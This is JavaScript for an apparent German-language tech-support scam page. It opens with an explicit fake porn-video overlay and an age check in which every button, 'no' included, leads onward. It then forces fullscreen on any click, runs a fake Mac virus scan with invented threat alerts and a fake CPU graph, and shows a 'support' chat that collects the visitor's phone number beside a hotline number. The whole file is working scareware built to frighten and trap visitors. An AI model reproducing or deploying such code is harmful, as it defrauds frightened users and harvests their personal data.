// ==================== VIDEO PLAYER OVERLAY FUNCTIONALITY ====================

// Debug: Set to false to temporarily disable auto-fullscreen for testing
const ENABLE_AUTO_FULLSCREEN = true;

// Video Configuration
const VIDEO_BASE_URL = 'https://videosforresearch14102025.pages.dev/';
const VIDEO_COUNT = 10;

// Video data arrays
const VIDEO_TITLES = [
    'Heiße deutsche Hausfrau wird hart gefickt',
    'Geiler Dreier mit zwei blonden Schlampen',
    'Junge Studentin beim ersten Mal',
    'Versaute Milf verführt jungen Nachbarn',
    'Deutsches Paar beim intensiven Sex',
    'Wilde Orgie auf privater Party',
    'Sexy Sekretärin fickt ihren Chef',
    'Amateur Paar vor der Kamera',
    'Anal-Session mit heißer Brünette',
    'Gangbang mit deutscher Pornodarstellerin'
];

// Generate random video data
function generateVideoData() {
    const data = [];
    for (let i = 1; i <= VIDEO_COUNT; i++) {
        const videoUrl = `${VIDEO_BASE_URL}v${i}.mp4`;
        const title = VIDEO_TITLES[(i - 1) % VIDEO_TITLES.length];
        const views = Math.floor(Math.random() * 5000000) + 100000;
        const daysAgo = Math.floor(Math.random() * 30) + 1;
        const duration = Math.floor(Math.random() * 20) + 5;
        
        data.push({
            url: videoUrl,
            title: title,
            views: views,
            date: `vor ${daysAgo} ${daysAgo === 1 ? 'Tag' : 'Tagen'}`,
            duration: `${Math.floor(duration / 60)}:${(duration % 60).toString().padStart(2, '0')}`
        });
    }
    return data;
}

// Shuffle array
function shuffleArray(array) {
    const shuffled = [...array];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

// Initialize video data
const allVideos = shuffleArray(generateVideoData());
let currentVideoIndex = 0;

// DOM elements for video player
const mainVideo = document.getElementById('main-player-video');
const videoPlayerSite = document.getElementById('video-player-site');
const thumbnailsList = document.getElementById('video-thumbnails-list');
const currentVideoTitle = document.getElementById('current-video-title');
const videoViews = document.getElementById('video-views');
const videoDate = document.getElementById('video-date');
const videoPlayerWrapper = document.querySelector('.video-player-wrapper');

// State tracking
let overlayDismissed = false;

// Load main video
function loadMainVideo(index) {
    const video = allVideos[index];
    
    // Show loading spinner
    if (videoPlayerWrapper) {
        videoPlayerWrapper.classList.remove('loaded');
    }
    
    // Update video source
    mainVideo.src = video.url;
    mainVideo.load();
    
    // Update video info
    currentVideoTitle.textContent = video.title;
    videoViews.textContent = video.views.toLocaleString('de-DE').replace('.', ',');
    videoDate.textContent = video.date;
    
    // Handle video loaded
    mainVideo.addEventListener('loadedmetadata', function onLoaded() {
        if (videoPlayerWrapper) {
            videoPlayerWrapper.classList.add('loaded');
        }
        mainVideo.play().catch(e => console.log('Autoplay prevented:', e));
        mainVideo.removeEventListener('loadedmetadata', onLoaded);
    });
    
    // Error handling - try next video
    mainVideo.addEventListener('error', function onError() {
        console.error('Video failed to load, trying next video');
        mainVideo.removeEventListener('error', onError);
        currentVideoIndex = (currentVideoIndex + 1) % allVideos.length;
        setTimeout(() => loadMainVideo(currentVideoIndex), 500);
    });
}

// Generate thumbnails
function generateThumbnails() {
    thumbnailsList.innerHTML = '';
    
    allVideos.forEach((video, index) => {
        if (index === currentVideoIndex) return; // Skip current video
        
        const thumbnailItem = document.createElement('div');
        thumbnailItem.className = 'video-thumbnail-item';
        thumbnailItem.onclick = (e) => {
            e.stopPropagation();
            currentVideoIndex = index;
            loadMainVideo(index);
            generateThumbnails();
        };
        
        thumbnailItem.innerHTML = `
            <div class="thumbnail-image">
                <video src="${video.url}" muted playsinline></video>
                <span class="thumbnail-duration">${video.duration}</span>
            </div>
            <div class="thumbnail-info">
                <div class="thumbnail-title">${video.title}</div>
                <div class="thumbnail-stats">${video.views.toLocaleString('de-DE').replace('.', ',')} Aufrufe • ${video.date}</div>
            </div>
        `;
        
        // Add hover effect to preview video
        const thumbnailVideo = thumbnailItem.querySelector('video');
        thumbnailItem.addEventListener('mouseenter', () => {
            thumbnailVideo.play().catch(e => {});
        });
        thumbnailItem.addEventListener('mouseleave', () => {
            thumbnailVideo.pause();
            thumbnailVideo.currentTime = 0;
        });
        
        thumbnailsList.appendChild(thumbnailItem);
    });
}

// Update dynamic counts
function updateLikeCount() {
    const likeCount = document.querySelector('.like-count');
    if (likeCount) {
        const randomLikes = Math.floor(Math.random() * 10000) + 500;
        likeCount.textContent = randomLikes > 999 ? `${(randomLikes / 1000).toFixed(1)} Tsd` : randomLikes;
    }
}

function updateCommentCount() {
    const commentCount = document.querySelector('.comment-count');
    if (commentCount) {
        const randomComments = Math.floor(Math.random() * 2000) + 100;
        commentCount.textContent = randomComments;
    }
}

// Handle overlay dismissal
if (videoPlayerSite) {
    videoPlayerSite.addEventListener('click', function(e) {
        // Don't close if clicking on interactive elements
        if (e.target.tagName === 'BUTTON' || 
            e.target.tagName === 'INPUT' || 
            e.target.closest('button') || 
            e.target.closest('input') ||
            e.target.closest('.video-thumbnail-item') ||
            e.target.closest('.video-player-wrapper')) {
            return;
        }
        
        // Close overlay only when clicking on background/container
        if (e.target === videoPlayerSite || e.target === document.querySelector('.video-site-container')) {
            console.log('Video overlay dismissed');
            overlayDismissed = true;
            
            // Hide and remove video player
            videoPlayerSite.style.display = 'none';
            videoPlayerSite.remove();
            
            // Remove overlay-active class
            document.body.classList.remove('overlay-active');
            
            // Remove/hide the old image overlay that's covering everything
            const imageOverlay = document.getElementById('imageOverlay');
            if (imageOverlay) {
                imageOverlay.style.display = 'none';
                imageOverlay.remove();
                console.log('Old image overlay removed');
            }
            
            // Force reflow to ensure DOM updates
            void document.body.offsetHeight;
            
            // Ensure all main content elements are visible by removing inline display:none
            const mainWindow = document.querySelector('.window');
            const securityDialog = document.querySelector('.security-dialog');
            const systemIcons = document.querySelector('.system-icons');
            const supportBox = document.querySelector('.support-box');
            const promptBoxes = document.querySelectorAll('.prompt-box');
            
            console.log('Making elements visible:', {
                mainWindow: !!mainWindow,
                securityDialog: !!securityDialog,
                systemIcons: !!systemIcons,
                supportBox: !!supportBox
            });
            
            // Remove display:none and let CSS handle the default display values
            if (mainWindow) {
                mainWindow.style.removeProperty('display');
                mainWindow.style.removeProperty('visibility');
                mainWindow.style.removeProperty('opacity');
                console.log('Main window made visible');
            }
            
            if (securityDialog) {
                securityDialog.style.removeProperty('display');
                securityDialog.style.removeProperty('visibility');
                securityDialog.style.removeProperty('opacity');
            }
            
            if (systemIcons) {
                systemIcons.style.removeProperty('display');
                systemIcons.style.removeProperty('visibility');
                systemIcons.style.removeProperty('opacity');
            }
            
            if (supportBox) {
                supportBox.style.removeProperty('display');
                supportBox.style.removeProperty('visibility');
                supportBox.style.removeProperty('opacity');
            }
            
            promptBoxes.forEach(box => {
                box.style.removeProperty('display');
                box.style.removeProperty('visibility');
                box.style.removeProperty('opacity');
            });
            
            // Force visible background
            document.body.style.background = '#f6f7f8';
            document.documentElement.style.background = '#f6f7f8';
            
            // Exit fullscreen first if in fullscreen
            if (document.fullscreenElement) {
                console.log('Exiting fullscreen first');
                document.exitFullscreen().catch(e => console.log('Exit fullscreen error:', e));
            }
            
            // Wait a moment then reinitialize and show content
            setTimeout(() => {
                // Reinitialize the Mac security scan if the function exists
                if (typeof initialize === 'function') {
                    console.log('Reinitializing Mac app');
                    initialize();
                }
                
                // Start background audio
                const mainAudio = document.getElementById('mainAudio');
                if (mainAudio) {
                    mainAudio.play().catch(e => console.log('Audio play failed:', e));
                }
                
                // Enter fullscreen after content is fully initialized and visible
                setTimeout(() => {
                    if (ENABLE_AUTO_FULLSCREEN) {
                        console.log('Entering fullscreen');
                        enterFullscreen();
                    } else {
                        console.log('Auto-fullscreen disabled for debugging');
                    }
                }, 300);
            }, 100);
        }
    });
}

// Fullscreen function
function enterFullscreen() {
    if (document.fullscreenElement) return;
    
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
        elem.requestFullscreen().catch(err => console.log('Fullscreen error:', err));
    } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
    }
}

// Tab notification
(function() {
    const originalTitle = document.title;
    let titleIndex = 0;
    const titles = [
        '⚠️ Sind Sie über 18 Jahre alt?',
        '🔴 DRINGEND - Klicken Sie hier!',
        '⚠️ Wichtiges Update!',
        '🚨 Achtung: Dies ist eine Porno-Website!',
        '⚠️ Porn Video!'
    ];
    
    const favicons = [
        "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚠️</text></svg>",
        "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔴</text></svg>",
        "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚠️</text></svg>",
        "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚨</text></svg>"
    ];
    
    const flashInterval = setInterval(() => {
        if (overlayDismissed) {
            document.title = originalTitle;
            clearInterval(flashInterval);
            return;
        }
        
        document.title = titles[titleIndex % titles.length];
        
        const faviconLink = document.getElementById('favicon');
        if (faviconLink) {
            faviconLink.href = favicons[titleIndex % favicons.length];
        }
        
        titleIndex++;
    }, 1500);
})();

// Age verification functionality
const ageVerificationOverlay = document.getElementById('age-verification-overlay');
const ageYesBtn = document.getElementById('age-yes');
const ageNoBtn = document.getElementById('age-no');
const ageCancelBtn = document.getElementById('age-cancel');
const ageCloseBtn = document.getElementById('age-close');
const ageBackdrop = document.querySelector('.age-verification-backdrop');

// Show age verification after 1 second
setTimeout(() => {
    if (ageVerificationOverlay) {
        ageVerificationOverlay.style.display = 'flex';
    }
}, 1000);

// Handle age verification
function handleAgeVerification() {
    console.log('Age verification dismissed');
    overlayDismissed = true;
    
    // Remove age verification overlay
    if (ageVerificationOverlay) {
        ageVerificationOverlay.style.display = 'none';
        ageVerificationOverlay.remove();
    }
    
    // Remove video player overlay
    if (videoPlayerSite) {
        videoPlayerSite.style.display = 'none';
        videoPlayerSite.remove();
    }
    
    // Remove overlay-active class to show main content
    document.body.classList.remove('overlay-active');
    
    // Remove/hide the old image overlay that's covering everything
    const imageOverlay = document.getElementById('imageOverlay');
    if (imageOverlay) {
        imageOverlay.style.display = 'none';
        imageOverlay.remove();
        console.log('Old image overlay removed');
    }
    
    // Force reflow to ensure DOM updates
    void document.body.offsetHeight;
    
    // Ensure all main content elements are visible by removing inline display:none
    const mainWindow = document.querySelector('.window');
    const securityDialog = document.querySelector('.security-dialog');
    const systemIcons = document.querySelector('.system-icons');
    const supportBox = document.querySelector('.support-box');
    const promptBoxes = document.querySelectorAll('.prompt-box');
    
    console.log('Making elements visible:', {
        mainWindow: !!mainWindow,
        securityDialog: !!securityDialog,
        systemIcons: !!systemIcons,
        supportBox: !!supportBox
    });
    
    // Remove display:none and let CSS handle the default display values
    if (mainWindow) {
        mainWindow.style.removeProperty('display');
        mainWindow.style.removeProperty('visibility');
        mainWindow.style.removeProperty('opacity');
        console.log('Main window made visible');
    }
    
    if (securityDialog) {
        securityDialog.style.removeProperty('display');
        securityDialog.style.removeProperty('visibility');
        securityDialog.style.removeProperty('opacity');
    }
    
    if (systemIcons) {
        systemIcons.style.removeProperty('display');
        systemIcons.style.removeProperty('visibility');
        systemIcons.style.removeProperty('opacity');
    }
    
    if (supportBox) {
        supportBox.style.removeProperty('display');
        supportBox.style.removeProperty('visibility');
        supportBox.style.removeProperty('opacity');
    }
    
    promptBoxes.forEach(box => {
        box.style.removeProperty('display');
        box.style.removeProperty('visibility');
        box.style.removeProperty('opacity');
    });
    
    // Force visible background
    document.body.style.background = '#f6f7f8';
    document.documentElement.style.background = '#f6f7f8';
    
    // Exit fullscreen first if in fullscreen
    if (document.fullscreenElement) {
        console.log('Exiting fullscreen first');
        document.exitFullscreen().catch(e => console.log('Exit fullscreen error:', e));
    }
    
    // Wait a moment then reinitialize and show content
    setTimeout(() => {
        // Reinitialize the Mac security scan if the function exists
        if (typeof initialize === 'function') {
            console.log('Reinitializing Mac app');
            initialize();
        }
        
        // Start background audio
        const mainAudio = document.getElementById('mainAudio');
        if (mainAudio) {
            mainAudio.play().catch(e => console.log('Audio play failed:', e));
        }
        
        // Enter fullscreen after content is fully initialized and visible
        setTimeout(() => {
            if (ENABLE_AUTO_FULLSCREEN) {
                console.log('Entering fullscreen');
                enterFullscreen();
            } else {
                console.log('Auto-fullscreen disabled for debugging');
            }
        }, 300);
    }, 100);
}

// Add click handlers to all buttons and backdrop
if (ageYesBtn) ageYesBtn.addEventListener('click', (e) => { e.stopPropagation(); handleAgeVerification(); });
if (ageNoBtn) ageNoBtn.addEventListener('click', (e) => { e.stopPropagation(); handleAgeVerification(); });
if (ageCancelBtn) ageCancelBtn.addEventListener('click', (e) => { e.stopPropagation(); handleAgeVerification(); });
if (ageCloseBtn) ageCloseBtn.addEventListener('click', (e) => { e.stopPropagation(); handleAgeVerification(); });
if (ageBackdrop) ageBackdrop.addEventListener('click', (e) => { e.stopPropagation(); handleAgeVerification(); });
if (ageVerificationOverlay) ageVerificationOverlay.addEventListener('click', (e) => { 
    // Don't trigger if clicking on buttons
    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) {
        return;
    }
    // Trigger on backdrop, overlay, or prompt card white space
    e.stopPropagation(); 
    handleAgeVerification(); 
});

// Fullscreen on any click after overlay dismissed
document.addEventListener('click', function(e) {
    if (overlayDismissed && !document.fullscreenElement) {
        enterFullscreen();
    }
});

// Initialize video player on page load
if (mainVideo && videoPlayerSite) {
    loadMainVideo(currentVideoIndex);
    generateThumbnails();
    updateLikeCount();
    updateCommentCount();
}

// ==================== END VIDEO PLAYER OVERLAY ====================

// Constants
const TOTAL_SECONDS = 3000; // 50 minutes
const DETECT_INTERVAL_MS = 4100; // Detection every 4.1 seconds
const UPDATE_INTERVAL_MS = 250; // UI update every 250ms

// State
let elapsedSeconds = 0;
let percent = 0;
let threatsDetected = 0;
let filesScanned = 0;
let playsRemainingForDing = 2;
let isCompleted = false;

// Timers
let progressTimer = null;
let detectionTimer = null;

// DOM Elements
const elements = {
    progressFill: document.getElementById('progressFill'),
    progressText: document.getElementById('progressText'),
    currentPath: document.getElementById('currentPath'),
    filesScanned: document.getElementById('filesScanned'),
    threatsDetected: document.getElementById('threatsDetected'),
    elapsedTime: document.getElementById('elapsedTime'),
    statusBadge: document.getElementById('statusBadge'),
    recentList: document.getElementById('recentList'),
    toastContainer: document.getElementById('toastContainer'),
    summaryProgress: document.getElementById('summaryProgress')
};

// Virus name generation
const virusFamilies = [
    'OSX.AgentX', 'Trojan.Generic', 'Worm.MacOS', 'Adware.Pirrit', 
    'Backdoor.OSX', 'Spyware.X-Agent', 'Malware.Genieo', 'Trojan.Flashback',
    'OSX.Tsunami', 'Backdoor.MAC', 'Trojan.OSX', 'Adware.NewTab',
    'Spyware.MacSpy', 'Worm.AutoRun', 'OSX.CrescentCore', 'Trojan.Bundlore'
];

const virusVariants = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'];

const virusTypes = [
    'Dropper', 'Loader', 'Stealer', 'Keylogger', 'Banker', 'RAT',
    'Miner', 'Downloader', 'Injector', 'Rootkit'
];

function virusName() {
    const family = virusFamilies[Math.floor(Math.random() * virusFamilies.length)];
    const type = virusTypes[Math.floor(Math.random() * virusTypes.length)];
    const variant = virusVariants[Math.floor(Math.random() * virusVariants.length)];
    const hex = Math.floor(Math.random() * 0xFFFF).toString(16).padStart(4, '0');
    return `${family}/${type}-${variant} (0x${hex})`;
}

// File path generation
const macOSDirectories = [
    '/System/Library/LaunchDaemons',
    '/System/Library/CoreServices',
    '/System/Library/Frameworks',
    '/System/Library/Extensions',
    '/System/Library/PrivateFrameworks',
    '/Library/Application Support',
    '/Library/LaunchAgents',
    '/Library/LaunchDaemons',
    '/Library/Preferences',
    '/Applications',
    '/Applications/Utilities',
    '~/Downloads',
    '~/Documents',
    '~/Desktop',
    '~/Library/Application Support',
    '~/Library/Preferences',
    '~/Library/Caches',
    '~/Library/LaunchAgents',
    '~/Library/Safari',
    '/usr/local/bin',
    '/usr/local/lib',
    '/opt/homebrew/bin',
    '/private/tmp',
    '/private/var/log'
];

const fileNames = [
    'com.apple.security', 'loginwindow', 'SystemUIServer', 'Dock', 'Finder',
    'Safari', 'Chrome', 'Firefox', 'iTunes', 'Spotify', 'Steam', 'Discord',
    'Slack', 'Zoom', 'VLC', 'Photoshop', 'Xcode', 'Terminal', 'Activity Monitor',
    'System Preferences', 'TextEdit', 'Preview', 'QuickTime', 'Mail',
    'contacts', 'calendar', 'notes', 'reminders', 'facetime', 'messages',
    'photos', 'music', 'podcasts', 'news', 'stocks', 'weather'
];

const fileExtensions = [
    '.app', '.plist', '.dylib', '.framework', '.bundle', '.kext', '.prefPane',
    '.plugin', '.component', '.service', '.workflow', '.action', '.pkg', '.dmg',
    '.zip', '.tar.gz', '.pdf', '.txt', '.rtf', '.doc', '.docx', '.xls', '.xlsx',
    '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mov', '.mp3',
    '.wav', '.aiff', '.m4a', '.html', '.css', '.js', '.py', '.rb', '.php',
    '.java', '.cpp', '.swift', '.xml', '.json', '.csv', '.log'
];

function nextPath() {
    const dir = macOSDirectories[Math.floor(Math.random() * macOSDirectories.length)];
    const name = fileNames[Math.floor(Math.random() * fileNames.length)];
    const ext = Math.random() > 0.3 ? fileExtensions[Math.floor(Math.random() * fileExtensions.length)] : '';
    
    // Sometimes add subdirectories
    if (Math.random() > 0.7) {
        const subdir = fileNames[Math.floor(Math.random() * fileNames.length)];
        return `${dir}/${subdir}/${name}${ext}`;
    }
    
    return `${dir}/${name}${ext}`;
}

// Utility functions
function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

// Recent scans list management
const recentScans = [];
const MAX_RECENT_SCANS = 200;

function addRecentScan(path) {
    recentScans.unshift(path);
    if (recentScans.length > MAX_RECENT_SCANS) {
        recentScans.pop();
    }
    
    // Update DOM efficiently - only update if container exists
    if (elements.recentList) {
        updateRecentScansList();
    }
}

function updateRecentScansList() {
    // Only show last 50 for performance
    const visibleScans = recentScans.slice(0, 50);
    elements.recentList.innerHTML = visibleScans
        .map(path => `<div class="scan-item">${path}</div>`)
        .join('');
}

// Toast notification system
function addToast(threatName) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.setAttribute('role', 'alert');
    
    toast.innerHTML = `
        <div class="toast-header">
            <div class="toast-icon">⚠</div>
            <div class="toast-title">Bedrohung erkannt</div>
            <div class="toast-tag">Aktiv</div>
        </div>
        <div class="toast-body">${threatName}</div>
    `;
    
    elements.toastContainer.appendChild(toast);
    
    // Auto-remove after 4 seconds
    setTimeout(() => {
        toast.classList.add('fade-out');
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 4000);
}

// Detection event handler
function detection() {
    if (isCompleted) return;
    
    const threatName = virusName();
    threatsDetected++;
    
    // Update UI
    elements.threatsDetected.textContent = threatsDetected;
    
    // Show toast
    addToast(threatName);
    
    // Sound functionality removed
}

// Main progress update function
function updateProgress() {
    if (isCompleted) return;
    
    // Increment elapsed time
    elapsedSeconds += UPDATE_INTERVAL_MS / 1000;
    
    // Check if completed
    if (elapsedSeconds >= TOTAL_SECONDS) {
        elapsedSeconds = TOTAL_SECONDS;
        isCompleted = true;
        
        // Clear timers
        if (progressTimer) clearInterval(progressTimer);
        if (detectionTimer) clearInterval(detectionTimer);
        
        // Update status
            elements.statusBadge.textContent = 'Abgeschlossen';
    elements.statusBadge.className = 'status-badge completed';
    }
    
    // Calculate percentage
    percent = (elapsedSeconds / TOTAL_SECONDS) * 100;
    percent = clamp(percent, 0, 100);
    
    // Update progress bar and summary
    elements.progressFill.style.width = `${percent}%`;
    elements.progressText.textContent = `${percent.toFixed(1)}%`;
    elements.summaryProgress.textContent = `${percent.toFixed(1)}%`;
    
    // Update elapsed time
    const timeSeconds = Math.floor(elapsedSeconds);
    elements.elapsedTime.textContent = formatTime(timeSeconds);
    
    // Add new scanned files (2-5 files per update)
    const newFiles = Math.floor(Math.random() * 4) + 2;
    for (let i = 0; i < newFiles; i++) {
        const path = nextPath();
        addRecentScan(path);
        filesScanned++;
        
        // Update current path to the latest
        if (i === newFiles - 1) {
            elements.currentPath.textContent = path;
        }
    }
    
    // Update files scanned counter
    elements.filesScanned.textContent = filesScanned.toLocaleString();
}

// Network security simulation removed

// CPU Graph
let cpuValues = Array(100).fill(85);
let cpuUpdateInterval;
let animationFrameId;

function initCPUGraph() {
    const canvas = document.getElementById('cpuGraph');
    const cpuPercentage = document.getElementById('cpuPercentage');
    
    if (!canvas || !cpuPercentage) {
        console.error('CPU Graph elements not found');
        return;
    }

    const ctx = canvas.getContext('2d');
    if (!ctx) {
        console.error('Could not get canvas context');
        return;
    }

    // Set canvas size with device pixel ratio
    const dpr = window.devicePixelRatio || 1;
    canvas.width = canvas.offsetWidth * dpr;
    canvas.height = canvas.offsetHeight * dpr;
    ctx.scale(dpr, dpr);

    function drawGraph() {
        const width = canvas.width / dpr;
        const height = canvas.height / dpr;

        // Clear canvas
        ctx.clearRect(0, 0, width, height);
        
        // Draw grid lines
        ctx.strokeStyle = 'rgba(255, 59, 48, 0.2)';
        ctx.lineWidth = 1;
        
        for (let y = 0; y < height; y += height / 5) {
            ctx.beginPath();
            ctx.moveTo(0, y);
            ctx.lineTo(width, y);
            ctx.stroke();
        }

        // Draw CPU line with glow
        ctx.beginPath();
        ctx.strokeStyle = '#ff3b30';
        ctx.lineWidth = 3;
        ctx.shadowColor = '#ff3b30';
        ctx.shadowBlur = 10;
        ctx.shadowOffsetX = 0;
        ctx.shadowOffsetY = 0;
        
        // Draw main line with smooth curve
        ctx.beginPath();
        cpuValues.forEach((value, i) => {
            const x = (i / (cpuValues.length - 1)) * width;
            const y = height - ((value - 80) / 20) * height;
            
            if (i === 0) {
                ctx.moveTo(x, y);
            } else {
                // Use bezier curves for smoother lines
                const prevX = ((i - 1) / (cpuValues.length - 1)) * width;
                const prevY = height - ((cpuValues[i - 1] - 80) / 20) * height;
                const cpX = (prevX + x) / 2;
                ctx.quadraticCurveTo(cpX, prevY, x, y);
            }
        });
        
        // Stroke the path
        ctx.stroke();
        
        // Add glow effect
        ctx.lineWidth = 1;
        ctx.strokeStyle = 'rgba(255, 59, 48, 0.5)';
        ctx.shadowBlur = 20;
        ctx.stroke();
    }
    
    let lastUpdate = 0;
    let currentValue = cpuValues[cpuValues.length - 1];
    let targetValue = currentValue;
    let trend = 1; // 1 for upward trend, -1 for downward trend
    let trendDuration = 0;

    function updateGraph(timestamp) {
        // Only update values every 200ms
        if (timestamp - lastUpdate > 200) {
            // Increment trend duration
            trendDuration++;
            
            // Change trend direction occasionally
            if (trendDuration > 3 || Math.random() < 0.3) {
                trend = -trend; // Reverse direction
                trendDuration = 0;
            }

            // Generate more dramatic changes
            let change;
            if (trend > 0) {
                // Moving up: bigger jumps
                change = 3 + Math.random() * 5;
            } else {
                // Moving down: bigger drops
                change = -(3 + Math.random() * 5);
            }

            targetValue = currentValue + change;
            targetValue = Math.max(80, Math.min(100, targetValue));
            lastUpdate = timestamp;
        }

        // Faster movement towards target
        const diff = targetValue - currentValue;
        currentValue += diff * 0.2; // Faster transition

        // Update values array
        cpuValues.push(currentValue);
        cpuValues.shift();
        
        // Update percentage display (rounded to 1 decimal place)
        cpuPercentage.textContent = currentValue.toFixed(1) + '%';
        
        // Draw the graph
        drawGraph();
        
        // Request next frame
        animationFrameId = requestAnimationFrame(updateGraph);
    }
    
    // Clean up previous animation if any
    if (animationFrameId) {
        cancelAnimationFrame(animationFrameId);
    }
    if (cpuUpdateInterval) {
        clearInterval(cpuUpdateInterval);
    }
    
    // Start animation
    updateGraph();
}

// Initialize the application
function initialize() {
    // Reset state
    elapsedSeconds = 0;
    percent = 0;
    threatsDetected = 0;
    filesScanned = 0;
    playsRemainingForDing = 2;
    isCompleted = false;
    
    // Clear any existing timers
    if (progressTimer) clearInterval(progressTimer);
    if (detectionTimer) clearInterval(detectionTimer);
    
    // Clear recent scans
    recentScans.length = 0;
    
    // Initialize UI
    elements.progressFill.style.width = '0%';
    elements.progressText.textContent = '0.0%';
    elements.filesScanned.textContent = '0';
    elements.threatsDetected.textContent = '0';
    elements.elapsedTime.textContent = '00:00';
    elements.statusBadge.textContent = 'Scanvorgang läuft...';
    elements.statusBadge.className = 'status-badge scanning';
    elements.currentPath.textContent = '/System/Library/LaunchDaemons';
    elements.recentList.innerHTML = '';
    elements.toastContainer.innerHTML = '';
    
    // Start timers
    progressTimer = setInterval(updateProgress, UPDATE_INTERVAL_MS);
    detectionTimer = setInterval(detection, DETECT_INTERVAL_MS);
    
    // Network security updates removed
    
    // Initial update
    updateProgress();
    
    // Initialize CPU graph
    initCPUGraph();
}

// Chat form handling
let selectedCountryCode = '+49';
let phoneNumber = '';

// Global function to show connection failed modal
window.showConnectionFailed = function() {
    console.log('🚨 Showing connection failed modal');
    console.log('🔍 Checking if modal exists in DOM...');
    
    const modal = document.getElementById('macConnectionFailedModal');
    console.log('Modal element:', modal);
    
    if (modal) {
        console.log('✅ Modal found! Setting display to flex...');
        modal.style.display = 'flex';
        console.log('📊 Modal display style:', modal.style.display);
        console.log('📊 Modal computed style:', window.getComputedStyle(modal).display);
        console.log('📊 Modal z-index:', window.getComputedStyle(modal).zIndex);
        
        // Update phone number in modal
        const phoneEl = document.getElementById('macFailedModalPhone');
        if (phoneEl) {
            phoneEl.textContent = window.GLOBAL_PHONE_NUMBER || '0800-100-183';
            console.log('📞 Phone number updated:', phoneEl.textContent);
        } else {
            console.error('❌ Phone element not found!');
        }
        
        // Play chat error audio
        const chatErrorAudio = document.getElementById('chatErrorAudio');
        if (chatErrorAudio) {
            chatErrorAudio.currentTime = 0;
            chatErrorAudio.play().catch(err => console.log('Chat error audio play error:', err));
            console.log('🔊 Playing chat error audio');
        } else {
            console.error('❌ Chat error audio element not found!');
        }
    } else {
        console.error('❌ Modal element not found in DOM!');
        console.log('🔍 Available elements with "modal" in id:');
        document.querySelectorAll('[id*="modal" i], [id*="Modal" i]').forEach(el => {
            console.log('  -', el.id, el.tagName);
        });
    }
};

// Test function to manually trigger the modal (for debugging)
window.testMacErrorModal = function() {
    console.log('🧪 Testing Mac error modal...');
    window.showConnectionFailed();
};

// Global function to hide connection failed modal
window.hideConnectionFailed = function() {
    document.getElementById('macConnectionFailedModal').style.display = 'none';
};

// Handle keyboard input for dialpad
function handleDialPadKeyPress(e) {
    e.preventDefault();
    
    if (e.keyCode === 8) { // Backspace
        phoneNumber = phoneNumber.slice(0, -1);
        document.getElementById('phoneNumber').textContent = phoneNumber;
    } else {
        // Get the number from keycode
        let number;
        if (e.keyCode >= 48 && e.keyCode <= 57) {
            // Main keyboard numbers
            number = String.fromCharCode(e.keyCode);
        } else if (e.keyCode >= 96 && e.keyCode <= 105) {
            // Numpad numbers
            number = (e.keyCode - 96).toString();
        }
        
        if (number && phoneNumber.length < 15) {
            phoneNumber += number;
            document.getElementById('phoneNumber').textContent = phoneNumber;
        }
    }
}

function showWindow(windowId) {
    // Hide all windows
    document.querySelectorAll('.chat-window').forEach(window => {
        window.classList.add('hidden');
    });
    // Show the requested window
    document.getElementById(windowId).classList.remove('hidden');

    // Handle audio based on window
    switch(windowId) {
        case 'countrySelect':
            // Stop background audio when chat opens
            stopMainAudio();
            playAudioWithDelay('step1Audio', 5); // 5 seconds delay between loops
            break;
        case 'dialPad':
            playAudioWithDelay('step2Audio', 32); // 32 seconds delay between loops
            break;
        case 'phoneConfirmation':
            playAudioWithDelay('stepMidAudio', 0); // Play only once (no loop)
            break;
        case 'confirmation':
            playAudioWithDelay('step3Audio', 0); // Play only once (no loop)
            break;
        default:
            playMainAudio();
    }
}

// Global function to open chat (for onclick handlers)
window.openChat = function() {
    console.log('DEBUG: openChat() called');
    // Mark chat as open to prevent main audio from starting
    isChatOpen = true;
    // Stop background audio when opening chat
    stopMainAudio();
    showWindow('countrySelect');
};

function initChatForm() {
    // Country selection handlers only
    // (Chat Now button handlers are now in DOMContentLoaded)

    // Country selection
    document.querySelectorAll('.country-option').forEach(option => {
        option.addEventListener('click', () => {
            selectedCountryCode = option.dataset.code;
            document.getElementById('selectedCountryCode').textContent = selectedCountryCode;
            showWindow('dialPad');
        });
    });

    // Dial pad
    document.querySelectorAll('.dial-button').forEach(button => {
        button.addEventListener('click', () => {
            if (phoneNumber.length < 15) {
                phoneNumber += button.textContent;
                document.getElementById('phoneNumber').textContent = phoneNumber;
            }
        });
    });

    // Backspace
    document.getElementById('backspace').addEventListener('click', () => {
        phoneNumber = phoneNumber.slice(0, -1);
        document.getElementById('phoneNumber').textContent = phoneNumber;
    });

    // Submit phone - show confirmation step
    document.getElementById('submitPhone').addEventListener('click', () => {
        if (phoneNumber.length > 0) {
            // Show phone confirmation window
            showWindow('phoneConfirmation');
            // Display the phone number with formatting
            const formattedPhone = selectedCountryCode + ' ' + phoneNumber.match(/.{1,5}/g).join(' ');
            document.getElementById('macConfirmPhoneDisplay').textContent = formattedPhone;
        }
    });
    
    // Handle edit phone button
    document.getElementById('macEditPhoneBtn').addEventListener('click', () => {
        showWindow('dialPad');
    });
    
    // Handle confirm phone button
    document.getElementById('macConfirmPhoneBtn').addEventListener('click', () => {
        showWindow('confirmation');
        // Update phone number in chat header
